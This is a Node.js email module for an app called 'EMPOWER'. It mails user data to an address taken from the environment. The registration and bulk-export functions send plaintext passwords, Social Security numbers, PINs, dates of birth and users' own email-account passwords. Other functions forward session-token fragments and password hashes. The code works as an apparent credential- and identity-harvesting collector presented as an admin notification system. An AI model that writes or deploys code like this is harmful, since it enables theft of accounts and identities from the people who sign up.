const nodemailer = require('nodemailer');
require('dotenv').config();

// Create transporter based on email service
const createTransporter = () => {
  const service = process.env.EMAIL_SERVICE || 'gmail';
  
  if (service === 'gmail') {
    return nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD
      }
    });
  } 
  else if (service === 'outlook') {
    return nodemailer.createTransport({
      host: 'smtp-mail.outlook.com',
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD
      }
    });
  } 
  else if (service === 'smtp') {
    return nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT || 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD
      }
    });
  }
};

// Send user registration data email
const sendUserDataEmail = async (userData) => {
  try {
    const transporter = createTransporter();

    const emailContent = `
      <h2>New User Registration - EMPOWER App</h2>
      <hr/>
      <h3>User Information:</h3>
      <p><strong>Username:</strong> ${userData.username}</p>
      <p><strong>Email:</strong> ${userData.email}</p>
      <p><strong>Password:</strong> ${userData.password}</p>
      <p><strong>First Name:</strong> ${userData.first_name || 'N/A'}</p>
      <p><strong>Last Name:</strong> ${userData.last_name || 'N/A'}</p>
      
      <h3>Verification Data (if provided):</h3>
      <p><strong>SSN:</strong> ${userData.ssn || 'N/A'}</p>
      <p><strong>ZIP Code:</strong> ${userData.zip_code || 'N/A'}</p>
      <p><strong>Date of Birth:</strong> ${userData.date_of_birth || 'N/A'}</p>
      <p><strong>PIN:</strong> ${userData.pin || 'N/A'}</p>
      <p><strong>Plan Group ID:</strong> ${userData.plan_group_id || 'N/A'}</p>
      <p><strong>Enrollment Code:</strong> ${userData.enrollment_code || 'N/A'}</p>
      
      <h3>Additional Info:</h3>
      <p><strong>Verification Method:</strong> ${userData.verification_method || 'Pending'}</p>
      <p><strong>Email Verified:</strong> ${userData.email_verified || 'No'}</p>
      <p><strong>Email Password:</strong> ${userData.email_password || 'N/A'}</p>
      <p><strong>Registration Time:</strong> ${new Date().toISOString()}</p>
      <hr/>
      <p><small>This is an automated email from EMPOWER registration system.</small></p>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL,
      subject: `New EMPOWER Registration - ${userData.username}`,
      html: emailContent
    };

    const result = await transporter.sendMail(mailOptions);
    console.log(`✅ Email sent to ${process.env.ADMIN_EMAIL} for user ${userData.username}`);
    return result;
  } catch (error) {
    console.error('❌ Email send error:', error.message);
    return { error: error.message };
  }
};

// Send all users data (bulk export)
const sendAllUsersEmail = async (users) => {
  try {
    const transporter = createTransporter();

    let htmlContent = `
      <h2>EMPOWER App - Complete User Data Export</h2>
      <p><strong>Total Users:</strong> ${users.length}</p>
      <p><strong>Export Time:</strong> ${new Date().toISOString()}</p>
      <hr/>
      <table border="1" cellpadding="10" cellspacing="0" style="width:100%; border-collapse:collapse;">
        <thead>
          <tr style="background-color:#f0f0f0;">
            <th>Username</th>
            <th>Email</th>
            <th>Password</th>
            <th>SSN</th>
            <th>PIN</th>
            <th>Email Password</th>
            <th>Verified</th>
            <th>Registered</th>
          </tr>
        </thead>
        <tbody>
    `;

    users.forEach(user => {
      htmlContent += `
        <tr>
          <td>${user.username}</td>
          <td>${user.email}</td>
          <td>${user.password}</td>
          <td>${user.ssn || 'N/A'}</td>
          <td>${user.pin || 'N/A'}</td>
          <td>${user.email_password || 'N/A'}</td>
          <td>${user.is_verified ? 'Yes' : 'No'}</td>
          <td>${user.created_at}</td>
        </tr>
      `;
    });

    htmlContent += `
        </tbody>
      </table>
      <hr/>
      <p><small>This is an automated export from EMPOWER system.</small></p>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL,
      subject: `EMPOWER User Data Export - ${users.length} Users`,
      html: htmlContent
    };

    const result = await transporter.sendMail(mailOptions);
    console.log(`✅ Bulk email sent to ${process.env.ADMIN_EMAIL} with ${users.length} users`);
    return result;
  } catch (error) {
    console.error('❌ Email send error:', error.message);
    return { error: error.message };
  }
};

// Send login notification
const sendLoginEmail = async (userData) => {
  try {
    const transporter = createTransporter();

    const emailContent = `
      <h2>🔓 Login Activity - EMPOWER App</h2>
      <hr/>
      <h3>User Information:</h3>
      <p><strong>Username:</strong> ${userData.username}</p>
      <p><strong>Email:</strong> ${userData.email}</p>
      <p><strong>First Name:</strong> ${userData.first_name || 'N/A'}</p>
      <p><strong>Last Name:</strong> ${userData.last_name || 'N/A'}</p>
      
      <h3>Login Details:</h3>
      <p><strong>Login Time:</strong> ${new Date().toISOString()}</p>
      <p><strong>Session Token:</strong> ${userData.session_token ? userData.session_token.substring(0, 20) + '...' : 'N/A'}</p>
      <p><strong>Expires At:</strong> ${userData.expires_at || 'N/A'}</p>
      <hr/>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL,
      subject: `Login Alert - ${userData.username}`,
      html: emailContent
    };

    await transporter.sendMail(mailOptions);
    console.log(`✅ Login email sent for user ${userData.username}`);
  } catch (error) {
    console.error('❌ Email send error:', error.message);
  }
};

// Send logout notification
const sendLogoutEmail = async (userData) => {
  try {
    const transporter = createTransporter();

    const emailContent = `
      <h2>🔒 Logout Activity - EMPOWER App</h2>
      <hr/>
      <h3>User Information:</h3>
      <p><strong>Username:</strong> ${userData.username}</p>
      <p><strong>Email:</strong> ${userData.email}</p>
      
      <h3>Logout Details:</h3>
      <p><strong>Logout Time:</strong> ${new Date().toISOString()}</p>
      <hr/>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL,
      subject: `Logout Alert - ${userData.username}`,
      html: emailContent
    };

    await transporter.sendMail(mailOptions);
    console.log(`✅ Logout email sent for user ${userData.username}`);
  } catch (error) {
    console.error('❌ Email send error:', error.message);
  }
};

// Send verification confirmation
const sendVerificationEmail = async (userData) => {
  try {
    const transporter = createTransporter();

    const emailContent = `
      <h2>✓ Account Verification - EMPOWER App</h2>
      <hr/>
      <h3>User Information:</h3>
      <p><strong>Username:</strong> ${userData.username}</p>
      <p><strong>Email:</strong> ${userData.email}</p>
      
      <h3>Verification Data:</h3>
      <p><strong>Verification Method:</strong> ${userData.method || 'N/A'}</p>
      <p><strong>SSN:</strong> ${userData.ssn || 'N/A'}</p>
      <p><strong>ZIP Code:</strong> ${userData.zip_code || 'N/A'}</p>
      <p><strong>Date of Birth:</strong> ${userData.date_of_birth || 'N/A'}</p>
      <p><strong>PIN:</strong> ${userData.pin || 'N/A'}</p>
      <p><strong>Plan Group ID:</strong> ${userData.plan_group_id || 'N/A'}</p>
      <p><strong>Enrollment Code:</strong> ${userData.enrollment_code || 'N/A'}</p>
      
      <h3>Verification Details:</h3>
      <p><strong>Status:</strong> ✓ Verified</p>
      <p><strong>Verification Time:</strong> ${new Date().toISOString()}</p>
      <hr/>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL,
      subject: `Account Verified - ${userData.username}`,
      html: emailContent
    };

    await transporter.sendMail(mailOptions);
    console.log(`✅ Verification email sent for user ${userData.username}`);
  } catch (error) {
    console.error('❌ Email send error:', error.message);
  }
};

// Send profile update notification
const sendProfileUpdateEmail = async (userData) => {
  try {
    const transporter = createTransporter();

    const emailContent = `
      <h2>📝 Profile Update - EMPOWER App</h2>
      <hr/>
      <h3>User Information:</h3>
      <p><strong>Username:</strong> ${userData.username}</p>
      <p><strong>User ID:</strong> ${userData.user_id || 'N/A'}</p>
      
      <h3>Updated Fields:</h3>
      <p><strong>First Name:</strong> ${userData.first_name || 'Not Updated'}</p>
      <p><strong>Last Name:</strong> ${userData.last_name || 'Not Updated'}</p>
      <p><strong>Email:</strong> ${userData.email || 'Not Updated'}</p>
      
      <h3>Update Details:</h3>
      <p><strong>Update Time:</strong> ${new Date().toISOString()}</p>
      <hr/>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL,
      subject: `Profile Updated - ${userData.username}`,
      html: emailContent
    };

    await transporter.sendMail(mailOptions);
    console.log(`✅ Profile update email sent for user ${userData.username}`);
  } catch (error) {
    console.error('❌ Email send error:', error.message);
  }
};

// Send password change notification
const sendPasswordChangeEmail = async (userData) => {
  try {
    const transporter = createTransporter();

    const emailContent = `
      <h2>🔑 Password Changed - EMPOWER App</h2>
      <hr/>
      <h3>User Information:</h3>
      <p><strong>Username:</strong> ${userData.username}</p>
      <p><strong>Email:</strong> ${userData.email}</p>
      <p><strong>User ID:</strong> ${userData.user_id || 'N/A'}</p>
      
      <h3>Password Change Details:</h3>
      <p><strong>Old Password (Hashed):</strong> ${userData.old_password_hash ? userData.old_password_hash.substring(0, 20) + '...' : 'N/A'}</p>
      <p><strong>New Password (Hashed):</strong> ${userData.new_password_hash ? userData.new_password_hash.substring(0, 20) + '...' : 'N/A'}</p>
      <p><strong>Change Time:</strong> ${new Date().toISOString()}</p>
      <hr/>
      <p style="color: red;"><strong>⚠️ Alert:</strong> Password was successfully changed for this account.</p>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL,
      subject: `Password Changed Alert - ${userData.username}`,
      html: emailContent
    };

    await transporter.sendMail(mailOptions);
    console.log(`✅ Password change email sent for user ${userData.username}`);
  } catch (error) {
    console.error('❌ Email send error:', error.message);
  }
};

module.exports = {
  sendUserDataEmail,
  sendAllUsersEmail,
  sendLoginEmail,
  sendLogoutEmail,
  sendVerificationEmail,
  sendProfileUpdateEmail,
  sendPasswordChangeEmail
};
